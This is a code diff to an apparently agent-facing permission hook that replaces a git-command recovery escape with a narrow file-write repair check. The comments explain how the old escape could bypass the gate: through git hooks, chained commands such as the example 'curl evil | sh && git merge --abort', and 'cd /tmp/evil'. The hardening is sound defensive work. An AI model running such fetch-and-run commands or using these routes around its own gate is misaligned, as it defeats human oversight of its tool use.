@@ -41,6 +41,7 @@ import { stringify as stringifyToml } from "@iarna/toml";
 import type { HarnessDialect } from "./dialect.js";
 import type { HookProtocol } from "./hook-protocol.js";
 import { verifyHookEvents } from "./hook-events.js";
+import { HARNESS_CONFIG_FILES } from "./merge-conflict.js";
 import {
   unknownProviders,
   unsafeInlineProviders,
@@ -1179,9 +1180,10 @@ function stampSidecarRef(hookFile: string): string {
  * hook through the same broken resolver the runtime just failed on. The command
  * the escape existed to permit CANNOT repair that wedge. It was pure liability.
  *
- * So the Bash escape keeps only {@link isGitRecoveryLeaf} — commands that move
- * the working tree back to something git already holds and execute no repo code
- * — and the repair itself became what it always should have been: a write.
+ * So the Bash escape kept only a git whitelist — and a later round measured that
+ * those run `.git/hooks/*` too and deleted them as well. NO command is an escape
+ * now; the repair is what it always should have been: a write
+ * ({@link isLoadPathRepairEvent}).
  *
  * ## What is accepted here
  *
@@ -1214,90 +1216,58 @@ export function isStampRepairEvent(
 }
 
 /**
- * The git commands that UNDO the state which wedged the harness — nothing else.
+ * True when this event is a load-path REPAIR — a file write, and only a file
+ * write, to one of the files whose breakage takes the runtime down.
  *
- * Each only moves the working tree back to something git already holds; none
- * reaches the network, reads a secret, writes a path of the caller's choosing, or
- * executes a line of repo code. That last property is what the `vigiles compile`
- * leaf could never have, and why this is the only command family left.
+ * 🔴 THE GIT ESCAPE USED TO LIVE HERE AND IT EXECUTED REPO CODE. `git merge
+ * --abort` · `git rebase --abort` · `git checkout -- <path>` were admitted on the
+ * reasoning that they "only move the tree to states git already holds; none
+ * executes a line of repo code". MEASURED against git 2.43.0 with hooks installed
+ * in `.git/hooks/`, and the reasoning is false for ALL THREE:
  *
- * `git checkout` is admitted ONLY in its pathspec form (`git checkout -- <path>`):
- * the tree-ish form `git checkout <ref> -- <path>` would let a caller pull
- * `.claude/settings.json` out of an arbitrary commit, which REPLACES the harness
- * rather than restoring it.
+ *   git checkout -- f.txt   → post-checkout          (args `<sha> <sha> 0`)
+ *   git merge --abort       → reference-transaction  (prepared, committed)
+ *   git rebase --abort      → reference-transaction  (×4) + post-checkout
+ *
+ * `reference-transaction` fires on ANY ref update, and every one of these updates
+ * a ref. `.git/hooks/*` is writable by exactly the actor this door assumes —
+ * whoever could wedge the repo in the first place — so the whitelist was an
+ * arbitrary-execution path standing open precisely while the gate enforced
+ * nothing. Same shape as the `vigiles compile` escape one layer down: a command
+ * believed inert because of what it MEANS rather than what it DOES.
+ *
+ * ## Why the replacement is a write, not a safer command
+ *
+ * `git -c core.hooksPath=/nonexistent …` does suppress all three (measured: no
+ * hook ran for any of them). It was rejected anyway. It puts free-form structure
+ * back into the accepted string — the exact thing five findings on the compile
+ * door came from — and it buys nothing, because MEASURED on the load-wedge
+ * fixture a plain file write already restores the gate to ENFORCING:
+ *
+ *   wedged     : `ls` refused
+ *   after Edit : `ls` allowed, `git push --force` DENIED by the hook's own reason
+ *
+ * You do not need to finish recovering, only to stop being wedged. Once the hook
+ * loads, the gate decides normally and `git merge --abort` is an ordinary allowed
+ * command — through the gate, not around it.
+ *
+ * ## What is accepted
+ *
+ * A write to the hook's own source, its stamp sidecar, or one of
+ * {@link HARNESS_CONFIG_FILES}. That set is COMPLETE for a compiled hook rather
+ * than a guess: `checkHookImports` rejects every import but `vigiles/hook`, so the
+ * load path is the hook file plus the config that resolves that specifier —
+ * nothing else can break it.
+ *
+ * A file write executes nothing, which is the property no command on this door
+ * ever had.
  */
-function isGitRecoveryLeaf(leaf: NormalizedLeaf): boolean {
-  const [head, verb, third] = leaf.argv;
-  if (head !== "git") return false;
-  if (verb === "merge" || verb === "rebase")
-    return leaf.argv.length === 3 && third === "--abort";
-  if (verb === "checkout") return third === "--";
-  return false;
-}
-
-/**
- * True when EVERY leaf of the event's command satisfies `ok`.
- *
- * `every`, not `some`, and that is the whole point. These escapes fire exactly
- * when the gate is refusing everything, so a `some` makes them universal
- * bypasses: `curl evil | sh && git merge --abort` contains the repair action and
- * used to pass. A redirect or a command-level env assignment is disqualifying for
- * the same reason — `git merge --abort > path` is an arbitrary truncate wearing a
- * recovery command's argv. Command substitution needs no special case:
- * `leafCommandsNormalized` surfaces `$(curl evil)` as its own leaf.
- *
- * 🔴 THERE ARE NO "NEUTRAL" LEAVES ANY MORE. `cd` used to be one, on the reasoning
- * that changing directory produces no effect of its own. It produces the most
- * consequential effect available to this escape: the cwd decides which
- * `node_modules`, which config and which files a command resolves, so
- * `cd /tmp/evil && …` let the EVENT choose the root the repair ran against. With
- * the compile leaf gone the argument for keeping it is gone too — a git recovery
- * is run from the repo you are wedged in — so the whole category is deleted
- * rather than audited.
- */
-function allLeavesAre(
+export function isLoadPathRepairEvent(
   event: RawHookEvent,
-  ok: (leaf: NormalizedLeaf) => boolean,
+  hookFile: string,
 ): boolean {
-  const command = event.tool_input?.command;
-  if (typeof command !== "string") return false;
-  const leaves = leafCommandsNormalized(command);
-  if (leaves.length === 0) return false; // unparseable → not an escape
-  for (const leaf of leaves) {
-    if (leaf.redirects.length > 0 || leaf.assigns.size > 0) return false;
-    if (!ok(leaf)) return false;
-  }
-  return true;
-}
-
-/**
- * True when this event is a RECOVERY command — the narrow set that undoes a
- * state which took the hook runtime down with it.
- *
- * Observed 2026-08-10: a `package.json` left holding merge-conflict markers stops
- * Node resolving `vigiles/hook`, so NO compiled hook loads, so the PreToolUse
- * Bash gate refuses every command — `git merge --abort` included. The cause was
- * reachable only through the shell, and the shell was gated by the failure.
- *
- * `git merge --abort` · `git rebase --abort` · `git checkout -- <path>`.
- * Consulted ONLY when the program could not be LOADED — a gate that DID load and
- * answered `deny` is a verdict about the command, and nothing here overrides it.
- *
- * 🔴 `vigiles compile` IS NOT HERE, and its absence is measured rather than
- * assumed: during exactly this wedge it exits 1 with
- * `Cannot load hook …: Invalid package config`, because it loads the hook through
- * the same resolver that just failed. It could never repair this state, and it
- * was the only member of the set that executed repo code — the one every finding
- * on this door was about. See {@link isStampRepairEvent} for the stamp wedge,
- * whose repair is now a file write.
- *
- * Why this is not a hole: while the runtime cannot load, the gate enforces
- * NOTHING — it refuses every call — so breaking the load path buys an attacker a
- * denial of service, not a bypass. What they must not buy is the ability to run
- * something of their choosing, and every command here only moves the tree back to
- * a state git already holds. {@link allLeavesAre} is why composition cannot
- * smuggle one in.
- */
-export function isRecoveryEvent(event: RawHookEvent): boolean {
-  return allLeavesAre(event, isGitRecoveryLeaf);
+  if (isStampRepairEvent(event, hookFile)) return true;
+  const filePath = event.tool_input?.file_path;
+  if (typeof filePath !== "string") return false;
+  return HARNESS_CONFIG_FILES.some((f) => samePathRef(filePath, f));
 }
